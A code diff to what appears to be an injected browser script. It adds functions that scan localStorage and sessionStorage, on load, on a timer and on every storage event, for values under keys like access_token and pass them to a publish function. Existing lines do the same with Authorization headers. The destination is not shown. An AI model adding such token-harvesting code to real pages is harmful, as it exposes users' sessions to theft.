@@ -11,6 +11,31 @@
       else if (headers && typeof headers === 'object') Object.entries(headers).forEach(([key, value]) => String(key).toLowerCase() === 'authorization' && publish(value));
     } catch {}
   };
+  const inspectTokenCache = (value, key = '', depth = 0) => {
+    if (depth > 6 || value == null) return;
+    if (typeof value === 'string') {
+      if (/^(access_token|accessToken|token)$/i.test(key)) publish(value);
+      if (/^[{[]/.test(value.trim())) {
+        try { inspectTokenCache(JSON.parse(value), key, depth + 1); } catch {}
+      }
+      return;
+    }
+    if (Array.isArray(value)) {
+      value.forEach(entry => inspectTokenCache(entry, key, depth + 1));
+      return;
+    }
+    if (typeof value === 'object') {
+      Object.entries(value).forEach(([entryKey, entry]) => inspectTokenCache(entry, entryKey, depth + 1));
+    }
+  };
+  const inspectStorage = storage => {
+    try {
+      for (let index = 0; index < storage.length; index++) {
+        const key = storage.key(index);
+        inspectTokenCache(storage.getItem(key), key || '', 0);
+      }
+    } catch {}
+  };
   const claimId = value => /^[0-9a-f]{8}-[0-9a-f-]{20,}$/i.test(String(value || '')) ? String(value) : '';
   const inspectClaims = (value, futureContext = false, depth = 0) => {
     if (!value || depth > 7) return;
@@ -70,4 +95,8 @@
     }, { once: true });
     return originalSend.apply(this, arguments);
   };
+  inspectStorage(localStorage);
+  inspectStorage(sessionStorage);
+  addEventListener('storage', event => inspectTokenCache(event.newValue, event.key || '', 0));
+  setTimeout(() => { inspectStorage(localStorage); inspectStorage(sessionStorage); }, 1200);
 })();
